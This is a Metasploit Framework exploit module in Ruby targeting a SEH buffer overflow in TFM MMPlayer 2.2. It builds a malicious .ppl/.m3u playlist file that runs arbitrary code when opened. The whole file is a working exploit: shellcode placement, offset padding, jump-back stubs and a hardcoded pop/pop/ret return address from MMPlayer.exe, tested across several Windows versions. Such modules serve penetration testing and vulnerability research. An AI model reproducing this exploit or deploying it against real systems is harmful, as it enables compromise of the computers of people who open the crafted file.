##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GoodRanking
 
    include Msf::Exploit::FILEFORMAT
 
    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'TFM MMPlayer (m3u/ppl File) Buffer Overflow',
            'Description'    => %q{
                This module exploits a buffer overflow in MMPlayer 2.2
                The vulnerability is triggered when opening a malformed M3U/PPL file
                that contains an overly long string, which results in overwriting a
                SEH record, thus allowing arbitrary code execution under the context
                of the user.
            },
            'License'        => MSF_LICENSE,
            'Author'         =>
                [
                    'RjRjh Hack3r',                        # Original discovery and exploit
                    'Brendan Coles <bcoles[at]gmail.com>'  # msf exploit
                ],
            'References'     =>
                [
                    [ 'OSVDB', '80532' ],
                    [ 'BID', '52698' ],
                    [ 'EDB', '18656' ], # .m3u
                    [ 'EDB', '18657' ]  # .ppl
                ],
            'DefaultOptions' =>
                {
                    'ExitFunction' => 'seh',
                    'InitialAutoRunScript' => 'migrate -f'
                },
            'Platform'       => 'win',
            'Targets'        =>
                [
                    # Tested on:
                    # Windows XP Pro SP3 - English
                    # Windows Vista SP1 - English
                    # Windows 7 Home Basic SP0 - English
                    # Windows 7 Ultimate SP1 - English
                    # Windows Server 2003 Enterprise SP2 - English
                    [ 'Windows Universal', { 'Ret' => 0x00401390 } ], # p/p/r -> MMPlayer.exe
                ],
            'Payload'        =>
                {
                    'Size' => 4000,
                    'BadChars' => "\x00\x0a\x0d",
                    'DisableNops' => false
                },
            'Privileged'     => false,
            'DisclosureDate' => 'Mar 23 2012',
            'DefaultTarget'  => 0
        ))
 
        register_options(
            [
                OptString.new('FILENAME', [ true, 'The file name.', 'msf.ppl'])
            ], self.class)
 
    end
 
    def exploit
 
        nops   = make_nops(10)
        sc     = payload.encoded
        offset = Rex::Text.rand_text_alphanumeric(4103 - sc.length - nops.length)
        jmp    = Rex::Arch::X86.jmp(-4108)            # near jump 4103 bytes
        nseh   = Rex::Arch::X86.jmp_short(-7)         # jmp back 7 bytes
        nseh  << Rex::Text.rand_text_alphanumeric(2)
        seh    = [target.ret].pack('V')
 
        sploit  = nops
        sploit << sc
        sploit << offset
        sploit << jmp
        sploit << nseh
        sploit << seh
 
        # write file
        file_create(sploit)
 
    end
end
